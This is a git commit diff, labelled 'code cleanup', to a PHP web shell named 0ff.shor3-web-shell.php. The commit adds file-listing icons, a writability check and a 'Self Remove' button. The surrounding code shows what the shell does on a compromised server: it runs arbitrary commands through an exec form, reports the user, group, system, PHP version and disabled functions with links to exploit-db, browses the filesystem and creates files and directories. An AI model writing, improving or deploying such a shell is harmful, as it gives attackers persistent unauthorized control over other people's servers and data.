4b04e1e41d1e0228e001be3341bc7b6302f0e59b
sug4r-wr41th <sug4r_wr41th@proton.me>
2025-02-17 21:58:21 +0100

    code cleanup

--- 0ff.shor3-web-shell.php
+++ 0ff.shor3-web-shell.php
@@ -47,6 +47,7 @@ function show_alert($msg)
 $cwd = posix_getcwd();
 $free_disk_space = disk_free_space("/");
 $total_disk_space = disk_total_space("/");
+$disable_functions = ini_get("disable_functions");
 
 if (isset($_GET["php_info"]))
 {
@@ -259,11 +260,11 @@ echo( sprintf("
 	sprintf("%s ( %s )", posix_getuid(), posix_getpwuid(posix_getuid())["name"]),
 	sprintf("%s ( %s )", posix_getgid(), posix_getgrgid(posix_getgid())["name"]),
 	implode(" ", posix_uname()),
-	PHP_VERSION . " <a href='https://duckduckgo.com/?q=php+vulnerabilities' target='_blank'>[DuckDuckGo]</a> <a href='https://www.exploit-db.com/search?q=PHP' target='_blank'>[exploit-db]</a>",
+	PHP_VERSION . " <a href='https://duckduckgo.com/?q=php+vulnerabilities' target='_blank'>[ DuckDuckGo ]</a> <a href='https://www.exploit-db.com/search?q=PHP' target='_blank'>[ exploit-db ]</a>",
 	((int) ini_get("safe_mode")) ? "ON": "OFF",
 	(function_exists("get_magic_quotes_runtime") AND get_magic_quotes_runtime()) ? "ON" : "OFF",
 	error_reporting(),
-	ini_get("disable_functions") == "" ? "none" : ini_get("disable_functions"),
+	$disable_functions == "" ? "none" : $disable_functions,
 	"<a href=" . $shell . '/?php_info' . ">[ phpinfo ]</a>",
 	extension_loaded("curl") ? "ON" : "OFF",
 	extension_loaded("rar") ? "ON" : "OFF",
@@ -288,7 +289,7 @@ echo( sprintf("
 	<input type="text" id="exec" name="exec" placeholder="ls -ls">
 	<input type="submit" value="Execute">
 	<?php
-	$functions = explode(",", ini_get("disable_functions"));
+	$functions = explode(",", $disable_functions);
 
 	foreach ($functions as &$f)
 	{
@@ -309,7 +310,7 @@ if (isset($result))
 
 <form action="<? echo($shell); ?>" method="POST">
 	<input type="hidden" id="kill" name="kill">
-	<input type="submit" value="Remove Shell">
+	<input type="submit" value="Self Remove">
 	<b>Warning!</b> You'll forever lose access to the shell. This action can't be undone.
 </form>
 
@@ -323,6 +324,7 @@ if ($cwd)
 	?>
 	<table>
 		<tr>
+			<th width="32"></th>
 			<th>Name</th>
 			<th>Size</th>
 			<th>Creation Date</th>
@@ -380,7 +382,24 @@ if ($cwd)
 									(($perms & 0x0200) ? 't' : 'x' ) :
 									(($perms & 0x0200) ? 'T' : '-'));
 
-			echo( sprintf("<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s / %s</td><td>%s</td></tr>",
+			$icon = null;
+
+			if ($f == "." OR
+					$f == "..")
+			{
+				$icon = "<svg viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'><g stroke-width='0'></g><g stroke-linecap='round' stroke-linejoin='round'></g><g > <path fill-rule='evenodd' clip-rule='evenodd' d='M6.46967 10.0303C6.17678 9.73744 6.17678 9.26256 6.46967 8.96967L11.4697 3.96967C11.7626 3.67678 12.2374 3.67678 12.5303 3.96967L17.5303 8.96967C17.8232 9.26256 17.8232 9.73744 17.5303 10.0303C17.2374 10.3232 16.7626 10.3232 16.4697 10.0303L12 5.56066L7.53033 10.0303C7.23744 10.3232 6.76256 10.3232 6.46967 10.0303Z' fill='#d8d8d8'></path> <g opacity='0.5'> <path d='M11.25 14.5C11.25 15.4534 11.5298 16.8667 12.3913 18.0632C13.2804 19.298 14.7556 20.25 17 20.25C17.4142 20.25 17.75 19.9142 17.75 19.5C17.75 19.0858 17.4142 18.75 17 18.75C15.2444 18.75 14.2196 18.0353 13.6087 17.1868C12.9702 16.3 12.75 15.2133 12.75 14.5L12.75 6.31066L12 5.56066L11.25 6.31066V14.5Z' fill='#d8d8d8'></path> <path d='M11.8023 3.77639C11.9568 3.73435 12.122 3.74254 12.2722 3.80095C12.1879 3.76805 12.096 3.75 12 3.75C11.9316 3.75 11.8653 3.75919 11.8023 3.77639Z' fill='#d8d8d8'></path> </g> </g></svg>";
+			}
+			else if (is_dir($f))
+			{
+				$icon = "<svg viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'><g stroke-width='0'></g><g stroke-linecap='round' stroke-linejoin='round'></g><g > <path opacity='0.5' d='M2 6.94975C2 6.06722 2 5.62595 2.06935 5.25839C2.37464 3.64031 3.64031 2.37464 5.25839 2.06935C5.62595 2 6.06722 2 6.94975 2C7.33642 2 7.52976 2 7.71557 2.01738C8.51665 2.09229 9.27652 2.40704 9.89594 2.92051C10.0396 3.03961 10.1763 3.17633 10.4497 3.44975L11 4C11.8158 4.81578 12.2237 5.22367 12.7121 5.49543C12.9804 5.64471 13.2651 5.7626 13.5604 5.84678C14.0979 6 14.6747 6 15.8284 6H16.2021C18.8345 6 20.1506 6 21.0062 6.76946C21.0849 6.84024 21.1598 6.91514 21.2305 6.99383C22 7.84935 22 9.16554 22 11.7979V14C22 17.7712 22 19.6569 20.8284 20.8284C19.6569 22 17.7712 22 14 22H10C6.22876 22 4.34315 22 3.17157 20.8284C2 19.6569 2 17.7712 2 14V6.94975Z' fill='#d8d8d8'></path> <path d='M20 6.23751C19.9992 5.94016 19.9949 5.76263 19.9746 5.60842C19.7974 4.26222 18.7381 3.2029 17.3919 3.02567C17.1969 3 16.9647 3 16.5003 3H9.98828C10.1042 3.10392 10.2347 3.23445 10.45 3.44975L11.0003 4C11.8161 4.81578 12.2239 5.22367 12.7124 5.49543C12.9807 5.64471 13.2653 5.7626 13.5606 5.84678C14.0982 6 14.675 6 15.8287 6H16.2024C17.9814 6 19.1593 6 20 6.23751Z' fill='#d8d8d8'></path> <path fill-rule='evenodd' clip-rule='evenodd' d='M12.25 10C12.25 9.58579 12.5858 9.25 13 9.25H18C18.4142 9.25 18.75 9.58579 18.75 10C18.75 10.4142 18.4142 10.75 18 10.75H13C12.5858 10.75 12.25 10.4142 12.25 10Z' fill='#d8d8d8'></path> </g></svg>";
+			}
+			else if (is_file($f))
+			{
+				$icon = "<svg viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'><g stroke-width='0'></g><g stroke-linecap='round' stroke-linejoin='round'></g><g > <g opacity='0.5'> <path fill-rule='evenodd' clip-rule='evenodd' d='M14 22H10C6.22876 22 4.34315 22 3.17157 20.8284C2 19.6569 2 17.7712 2 14V10C2 6.22876 2 4.34315 3.17157 3.17157C4.34315 2 6.23869 2 10.0298 2C10.6358 2 11.1214 2 11.53 2.01666C11.5166 2.09659 11.5095 2.17813 11.5092 2.26057L11.5 5.09497C11.4999 6.19207 11.4998 7.16164 11.6049 7.94316C11.7188 8.79028 11.9803 9.63726 12.6716 10.3285C13.3628 11.0198 14.2098 11.2813 15.0569 11.3952C15.8385 11.5003 16.808 11.5002 17.9051 11.5001L18 11.5001H21.9574C22 12.0344 22 12.6901 22 13.5629V14C22 17.7712 22 19.6569 20.8284 20.8284C19.6569 22 17.7712 22 14 22Z' fill='#d8d8d8'></path> </g> <path d='M6 13.75C5.58579 13.75 5.25 14.0858 5.25 14.5C5.25 14.9142 5.58579 15.25 6 15.25H14C14.4142 15.25 14.75 14.9142 14.75 14.5C14.75 14.0858 14.4142 13.75 14 13.75H6Z' fill='#d8d8d8'></path> <path d='M6 17.25C5.58579 17.25 5.25 17.5858 5.25 18C5.25 18.4142 5.58579 18.75 6 18.75H11.5C11.9142 18.75 12.25 18.4142 12.25 18C12.25 17.5858 11.9142 17.25 11.5 17.25H6Z' fill='#d8d8d8'></path> <path d='M11.5092 2.2601L11.5 5.0945C11.4999 6.1916 11.4998 7.16117 11.6049 7.94269C11.7188 8.78981 11.9803 9.6368 12.6716 10.3281C13.3629 11.0193 14.2098 11.2808 15.057 11.3947C15.8385 11.4998 16.808 11.4997 17.9051 11.4996L21.9574 11.4996C21.9698 11.6552 21.9786 11.821 21.9848 11.9995H22C22 11.732 22 11.5983 21.9901 11.4408C21.9335 10.5463 21.5617 9.52125 21.0315 8.79853C20.9382 8.6713 20.8743 8.59493 20.7467 8.44218C19.9542 7.49359 18.911 6.31193 18 5.49953C17.1892 4.77645 16.0787 3.98536 15.1101 3.3385C14.2781 2.78275 13.862 2.50487 13.2915 2.29834C13.1403 2.24359 12.9408 2.18311 12.7846 2.14466C12.4006 2.05013 12.0268 2.01725 11.5 2.00586L11.5092 2.2601Z' fill='#d8d8d8'></path> </g></svg>";
+			}
+
+			echo( sprintf("<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s / %s</td><td>%s</td></tr>",
+				$icon, 
 				$f,
 				is_file($f) ? format_size(filesize($f)) : "dir", 
 				date(DATE_RFC2822, filectime($f)),
@@ -399,14 +418,16 @@ if ($cwd)
 
 <form action="<? echo($shell); ?>" method="POST">
 	<input type="text" id="mk_file" name="mk_file" placeholder="file.tmp" required>
-	<input type="submit" value="Make File">
+	<input type="submit" value="Make File" <?php if (!is_writable($cwd)) { echo("disabled"); } ?> >
+	[ cwd <?php echo(is_writable($cwd) ? "is" : "is not"); ?> writable ]
 </form>
 
 <?php if (isset($result_mk_f)) { show_alert($result_mk_f); } ?>
 
 <form action="<? echo($shell); ?>" method="POST">
 	<input type="text" id="mk_dir" name="mk_dir" placeholder="var" required>
-	<input type="submit" value="Make Directory">
+	<input type="submit" value="Make Directory" <?php if (!is_writable($cwd)) { echo("disabled"); } ?>>
+	[ cwd <?php echo(is_writable($cwd) ? "is" : "is not"); ?> writable ]
 </form>
 
 <?php if (isset($result_mk_d)) { show_alert($result_mk_d); } ?>
